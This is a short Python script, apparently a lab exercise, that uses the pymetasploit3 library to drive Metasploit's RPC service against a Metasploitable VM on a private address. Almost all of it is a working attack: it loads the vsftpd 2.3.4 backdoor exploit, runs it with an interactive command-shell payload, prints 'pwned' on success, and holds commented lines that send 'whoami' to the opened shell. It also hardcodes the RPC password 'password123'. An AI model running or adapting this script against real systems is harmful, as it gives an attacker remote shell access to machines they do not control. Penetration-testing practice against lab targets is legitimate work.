'''
basic script to test using MSF via python
using metasploitable VM as a target
details:
pip install pymetasploit3
rtfm - https://github.com/DanMcInerney/pymetasploit3
based on ...
https://github.com/allfro/pymetasploit
TODO
add check for msfrpcd service running 
'''

from pymetasploit3.msfrpc import *

# help(MsfRpcClient)
metasploitableIP = '192.168.56.104'

# exact string is dependent on how msfrpc is started
# client = MsfRpcClient('yourpassword', port=55552, ssl=True)
# client = MsfRpcClient('password123')
# client2 = MsfRpcClient('password123', port=55553)

# started with this:
# msfrpcd -P password123

tgtExploit = 'unix/ftp/vsftpd_234_backdoor'
client = MsfRpcClient('password123', ssl=True)

# set an exploit to hit metasploitable FTP
exploit = client.modules.use('exploit', tgtExploit)
# exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

# set up params
exploit['RHOSTS'] = metasploitableIP
# select the payload
exploit.targetpayloads()

# run it
# if it fails jobid will be none, 
# it will be 0 or another int depending on how many times
# the scriptwas run 
exploitExec = exploit.execute(payload='cmd/unix/interact')

# check jobid
if exploitExec['job_id'] != 'none':
    print('pwned : ' + tgtExploit)

print(client.sessions.list)
print(client.jobs.list)
'''
# print info
# print(exploit.description)
# print options
# print(exploit.options)
print(type(exploitExec))
print(exploitExec)
print(exploitExec['job_id'])
'''
# shells
# shell = client.sessions('1')
# shell.write(('whoami'))
# print(shell.read())
# shell = exploitExec
